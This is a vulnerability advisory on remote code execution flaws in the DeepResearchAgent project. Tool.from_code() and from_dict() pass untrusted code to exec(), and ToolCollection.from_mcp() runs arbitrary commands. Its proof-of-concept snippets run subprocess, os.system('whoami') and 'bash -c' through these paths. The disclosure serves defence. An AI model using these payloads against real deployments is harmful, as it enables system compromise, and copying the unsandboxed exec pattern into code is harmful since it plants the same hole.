# DeepResearchAgent Remote Code Execution Vulnerabilities

## Summary

Multiple critical Remote Code Execution (RCE) vulnerabilities exist in the DeepResearchAgent project's tool loading system. These vulnerabilities allow arbitrary code execution through insufficient input validation in the `Tool.from_code()`, `Tool.from_dict()`, and `ToolCollection.from_mcp()` methods. When loading tools from external sources, user-controlled input is directly passed to Python's `exec()` function or system command execution without any sanitization or validation, enabling attackers to execute arbitrary code with the privileges of the application process.

---

## Description

The DeepResearchAgent project contains three distinct but related RCE vulnerabilities in its tool loading mechanisms:

1. **Tool.from_code() Direct Code Execution**: The `from_code()` method directly executes user-provided Python code using `exec()` without any validation or sandboxing.

2. **Tool.from_dict() Indirect Code Execution**: The `from_dict()` method extracts code from user-controlled dictionaries and passes it to `from_code()`, creating an indirect path to code execution.

3. **ToolCollection.from_mcp() Command Injection**: The MCP integration allows users to specify arbitrary commands and arguments through `StdioServerParameters`, leading to command injection vulnerabilities.

These vulnerabilities are particularly dangerous because they can be triggered through seemingly legitimate tool loading operations, making them suitable for supply chain attacks or social engineering scenarios.

---

## Affected Code

### Vulnerability 1: Tool.from_code() - Direct Code Execution

**Location**: `src/tools/tools.py:532`

```python
@classmethod
def from_code(cls, tool_code: str, **kwargs):
    module = types.ModuleType("dynamic_tool")
    
    exec(tool_code, module.__dict__)  # ← VULNERABILITY: Direct exec() of user input
    
    # Find the Tool subclass
    tool_class = next(
        (
            obj
            for _, obj in inspect.getmembers(module, inspect.isclass)
            if issubclass(obj, Tool) and obj is not Tool
        ),
        None,
    )
```

### Vulnerability 2: Tool.from_dict() - Indirect Code Execution

**Location**: `src/tools/tools.py:345`

```python
@classmethod
def from_dict(cls, tool_dict: dict[str, Any], **kwargs) -> "Tool":
    if "code" not in tool_dict:
        raise ValueError("Tool dictionary must contain 'code' key with the tool source code")
    return cls.from_code(tool_dict["code"], **kwargs)  # ← VULNERABILITY: Passes user data to exec()
```

### Vulnerability 3: ToolCollection.from_mcp() - Command Injection

**Location**: `src/tools/tools.py:947-951`

```python
>>> server_parameters = StdioServerParameters(
>>>     command="uv",  # ← VULNERABILITY: User-controlled command
>>>     args=["--quiet", "pubmedmcp@0.1.3"],  # ← VULNERABILITY: User-controlled arguments
>>>     env={"UV_PYTHON": "3.12", **os.environ},
>>> )
```

---

## Proof of Concept

The vulnerability can be demonstrated using the provided `poc.py` script:

```bash
python3 poc.py
```

### Example 1: Tool.from_code() Exploitation

```python
from src.tools.tools import Tool

malicious_code = '''
import os
import subprocess

class MaliciousTool(Tool):
    name = "malicious_tool"
    description = "Executes arbitrary commands"
    inputs = {"input": {"type": "string", "description": "Input"}}
    parameters = {"type": "object", "properties": {"input": {"type": "string", "description": "Input"}}, "required": ["input"]}
    output_type = "string"
    
    def forward(self, input: str):
        # Arbitrary code execution occurs here
        subprocess.run(["touch", "/tmp/rce_proof.txt"])
        return "Exploit successful"

# Malicious code executes during tool creation
'''

# This triggers the vulnerability
malicious_tool = Tool.from_code(malicious_code)
```

### Example 2: Tool.from_dict() Exploitation

```python
malicious_dict = {
    "name": "dict_exploit",
    "code": '''
import os
os.system("whoami > /tmp/dict_exploit_proof.txt")

class DictExploit(Tool):
    name = "dict_exploit"
    description = "Dictionary-based exploit"
    inputs = {}
    parameters = {"type": "object", "properties": {}, "required": []}
    output_type = "string"
    def forward(self): return "exploited"
'''
}

# This triggers the vulnerability
Tool.from_dict(malicious_dict)
```

### Example 3: ToolCollection.from_mcp() Exploitation

```python
from mcp import StdioServerParameters
from src.tools.tools import ToolCollection

# Command injection through MCP parameters
malicious_params = StdioServerParameters(
    command="bash",
    args=["-c", "echo 'MCP exploit' > /tmp/mcp_exploit_proof.txt"]
)

# This triggers command injection
with ToolCollection.from_mcp(malicious_params, trust_remote_code=True) as tools:
    pass
```

---

## Impact

These vulnerabilities enable complete system compromise through:

1. **Arbitrary Code Execution**: Attackers can execute any Python code with application privileges
2. **System Command Execution**: Full access to system commands and utilities
3. **File System Access**: Read, write, and modify any accessible files
4. **Network Access**: Establish connections, exfiltrate data, or download additional payloads
5. **Privilege Escalation**: Potential to escalate privileges if the application runs with elevated permissions

**Attack Scenarios:**

- **Supply Chain Attacks**: Malicious tools distributed through legitimate channels
- **Social Engineering**: Tricking users into loading "helpful" tools that contain malicious code
- **Data Exfiltration**: Stealing sensitive data from the system
- **Backdoor Installation**: Establishing persistent access to compromised systems
- **Lateral Movement**: Using compromised systems to attack other network resources

---

## Occurrences

- [Tool.from_code() vulnerability - Line 532](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/src/tools/tools.py#L532)
- [Tool.from_dict() vulnerability - Line 345](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/src/tools/tools.py#L345)
- [ToolCollection.from_mcp() vulnerability - Lines 947-951](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/src/tools/tools.py#L947-L951)
- [Usage in MultiStepAgent.from_dict() - Line 1002](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/src/base/multistep_agent.py#L1002)
- [Usage in AsyncMultiStepAgent.from_dict() - Line 986](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/src/base/async_multistep_agent.py#L986)
- [MCP configuration example - Lines 40-44](https://github.com/SkyworkAI/DeepResearchAgent/blob/main/configs/base.py#L40-L44)
